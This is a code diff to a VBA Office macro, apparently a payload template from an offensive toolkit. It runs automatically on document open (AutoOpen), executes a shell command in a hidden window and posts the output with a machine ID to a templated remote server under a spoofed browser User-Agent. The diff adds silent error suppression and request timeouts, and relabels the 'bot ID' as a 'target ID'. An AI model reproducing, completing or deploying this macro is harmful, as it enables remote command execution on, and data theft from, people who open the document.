@@ -9,17 +9,16 @@ Sub AutoOpen()
     Main
 End Sub
 
-
 Private Sub Main()
     Dim msg As String
     serverUrl = "<<<TEMPLATE>>>"
    	msg = "<<<TEMPLATE>>>"
+   	On Error GoTo byebye
     msg = PlayCmd(msg)
     SendResponse msg
-    End If
-
+    On Error GoTo 0
+    byebye:
 End Sub
-
 
 'Sen data using http post'
 'Note:
@@ -32,12 +31,12 @@ Private Function HttpPostData(URL As String, data As String) 'data must have for
     objHTTP.Open "POST", URL, False
     objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
     objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
+    objHTTP.SetTimeouts 2000, 2000, 2000, 2000
     objHTTP.send (data)
     HttpPostData = objHTTP.responseText
 End Function
 
-
-' Returns bot ID'
+' Returns target ID'
 Private Function GetId() As String
     Dim myInfo As String
     Dim myID As String
@@ -45,17 +44,15 @@ Private Function GetId() As String
     GetId = myID
 End Function
 
-
 'To send response for command'
 Private Function SendResponse(cmdOutput)
     Dim data As String
     Dim response As String
-    data = "id=" & GetId & "&cmdOutput=" & cmdOutput
+    data = "id=" & GetId & vbCrLf & "&cmdOutput=" & vbCrLf & cmdOutput
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
-
-' Play and return output any DOS command line
+' Play and return output any command line
 Private Function PlayCmd(sCmd As String) As String
     'Run a shell command, returning the output as a string'
     ' Using a hidden window, pipe the output of the command to the CLIP.EXE utility...
